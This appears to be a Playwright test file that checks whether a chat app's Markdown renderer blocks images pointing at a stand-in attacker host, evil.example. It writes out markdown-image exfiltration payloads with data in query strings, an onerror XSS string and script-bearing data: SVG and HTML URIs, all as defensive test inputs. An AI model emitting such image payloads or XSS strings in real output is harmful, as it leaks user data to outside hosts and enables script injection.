// QA-only security probes for T4's untested Markdown edge cases.
import { test, expect } from '@playwright/test'
import { loadFixtures, newVariantContext } from './lib.mjs'

const fx = loadFixtures()
const { ids } = fx
const MODEL = JSON.parse(fx.routes[`GET /api/sessions/${ids.s1}/messages`].body).messages[1].model
const sessionBody = (id) => JSON.parse(fx.routes[`GET /api/sessions/${id}/messages`].body)
const assistant = (content) => ({
  id: '9901', role: 'assistant', content, attachments: null, model: MODEL, prompt_tokens: 1, completion_tokens: 1,
  blocks: null, tool_calls: null, created_at: '2026-11-17T07:09:00.000Z', media_processing: null, intent_classify: null, reasoning: null,
})

async function render(browser, content) {
  const ctx = await newVariantContext(browser, { theme: 'dark', mobile: false })
  const page = await ctx.newPage()
  const requests = []
  await page.route('https://evil.example/**', (route) => {
    requests.push(route.request().url())
    return route.abort()
  })
  await page.route('**/api/me', (route) => route.fulfill({ json: { email: 'e2e-user@example.com', externalAssetOrigins: [] } }))
  const body = sessionBody(ids.s3)
  body.messages = [body.messages[0], assistant(content)]
  await page.route(`**/api/sessions/${ids.s3}/messages`, (route) => route.fulfill({ json: body }))
  await page.goto(`/#/chat/${ids.s3}`)
  return { ctx, page, requests }
}

test('network canary: inline markdown image never reaches the attacker route', async ({ browser }) => {
  const { ctx, page, requests } = await render(browser, '![probe](https://evil.example/image.png?d=QA_CANARY)')
  await page.waitForLoadState('networkidle')
  expect(requests).toEqual([])
  await expect(page.locator('.prose-chat .md-image-blocked')).toHaveCount(1)
  await ctx.close()
})

test('URL and alt edge cases remain blocked with named placeholders', async ({ browser }) => {
  const attack = [
    'Angle: ![angle](<https://evil.example/angle.png>)',
    'Uppercase: ![upper](HTTPS://EVIL.EXAMPLE/upper.png)',
    'Protocol relative: ![protocol](//evil.example/protocol.png)',
    'Entity encoded: ![entity](https&colon;//evil.example/entity.png)',
    `Long alt: ![${'x'.repeat(2048)}](https://evil.example/long.png)`,
    'HTML in alt: ![<img src=x onerror=alert(1)>](https://evil.example/alt.png)',
    'Reference: ![ref][r]\n\n[r]: https://evil.example/ref.png',
  ].join('\n\n')
  const { ctx, page, requests } = await render(browser, attack)
  const placeholders = page.locator('.prose-chat .md-image-blocked')
  await expect(placeholders).toHaveCount(7)
  for (let i = 0; i < 7; i++) {
    await expect(placeholders.nth(i)).toContainText('evil.example')
    await expect(placeholders.nth(i)).toHaveAttribute('role', 'img')
  }
  await expect(page.locator('.prose-chat img[src*="evil.example"]')).toHaveCount(0)
  await page.waitForLoadState('networkidle')
  expect(requests).toEqual([])
  await ctx.close()
})

// ruling r2-1: raw HTML <img> stays escaped text (no placeholder required); it must load nothing
test('a raw HTML img is inert: no <img>, no request', async ({ browser }) => {
  const { ctx, page, requests } = await render(browser, 'Raw: <img src="https://evil.example/raw.png" alt="raw chart">')
  await expect(page.locator('.prose-chat')).toContainText('raw chart')
  await expect(page.locator('.prose-chat img')).toHaveCount(0)
  await page.waitForLoadState('networkidle')
  expect(requests).toEqual([])
  await ctx.close()
})

test('a blocked image stays non-interactive even when markdown wraps it in a link', async ({ browser }) => {
  const { ctx, page } = await render(browser, '[![linked](https://evil.example/image.png)](https://evil.example/click)')
  const placeholder = page.locator('.prose-chat .md-image-blocked')
  await expect(placeholder).toHaveCount(1)
  await expect(placeholder).toContainText('evil.example')
  await expect(page.locator('.prose-chat a:has(.md-image-blocked)')).toHaveCount(0)
  await expect(page.locator('.prose-chat a[href*="evil.example"]')).toHaveCount(0) // unlinked, not navigable
  await ctx.close()
})

// ruling r2-3: SVG data: stays blocked by the sanitizer; both sources are placeholders and nothing runs or loads
test('data SVG scripts and external resources stay inert; non-image data MIME is blocked', async ({ browser }) => {
  const svg = '<svg xmlns="http://www.w3.org/2000/svg"><script>window.__qaSvgRan=true</script><image href="https://evil.example/svg-resource.png"/></svg>'
  const dataSvg = `data:image/svg+xml;base64,${Buffer.from(svg).toString('base64')}`
  const dataHtml = `data:text/html;base64,${Buffer.from('<script>window.__qaHtmlRan=true</script>').toString('base64')}`
  const { ctx, page, requests } = await render(browser, `![svg](${dataSvg})\n\n![html](${dataHtml})`)
  await expect(page.locator('.prose-chat img')).toHaveCount(0)
  await expect(page.locator('.prose-chat .md-image-blocked')).toHaveCount(2)
  expect(await page.evaluate(() => Boolean(window.__qaSvgRan || window.__qaHtmlRan))).toBe(false)
  await page.waitForLoadState('networkidle')
  expect(requests).toEqual([])
  await ctx.close()
})

test('rich editor saves the blocked image syntax unchanged after a text edit', async ({ browser }) => {
  const ctx = await newVariantContext(browser, { theme: 'dark', mobile: false })
  const page = await ctx.newPage()
  const imageRequests = []
  const saved = []
  await page.route('https://evil.example/**', (route) => {
    imageRequests.push(route.request().url())
    return route.abort()
  })
  const doc = { id: ids.doc, title: 'T', markdown: 'Hello ![pic](https://evil.example/d.png?x=secret) world' }
  await ctx.route(`**/api/documents/${ids.doc}`, (route) => {
    if (route.request().method() === 'PATCH') {
      const body = route.request().postDataJSON()
      saved.push(body)
      return route.fulfill({ json: { document: { ...doc, ...body } } })
    }
    return route.fulfill({ json: { document: doc } })
  })
  await page.goto(`/#/chat/${ids.s1}`)
  await page.getByText('Open in Slides Studio').first().waitFor()
  const openButton = page.getByRole('button', { name: 'Open', exact: true }).first()
  await openButton.scrollIntoViewIfNeeded()
  await openButton.click()
  const root = page.locator('[data-studio="doc"]')
  await root.waitFor()
  await root.getByRole('button', { name: 'Edit', exact: true }).click()
  const editor = root.getByRole('textbox', { name: 'Document text editor' })
  await editor.getByText('Hello').click()
  await page.keyboard.type('!')
  const patch = page.waitForRequest((request) => request.method() === 'PATCH' && request.url().endsWith(`/api/documents/${ids.doc}`))
  await root.getByRole('button', { name: 'Save', exact: true }).click()
  await patch
  expect(saved).toHaveLength(1)
  expect(saved[0].markdown).toContain('![pic](https://evil.example/d.png?x=secret)')
  expect(imageRequests).toEqual([])
  await ctx.close()
})

test('plain text links are unchanged and a link around a safe image keeps its link', async ({ browser }) => {
  const { ctx, page } = await render(browser, '[docs](https://docs.example/page) and [![ok](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)](https://docs.example/x)')
  await expect(page.locator('.prose-chat a[href="https://docs.example/page"]')).toHaveText('docs')
  await expect(page.locator('.prose-chat a[href="https://docs.example/x"] img')).toHaveCount(1)
  await ctx.close()
})
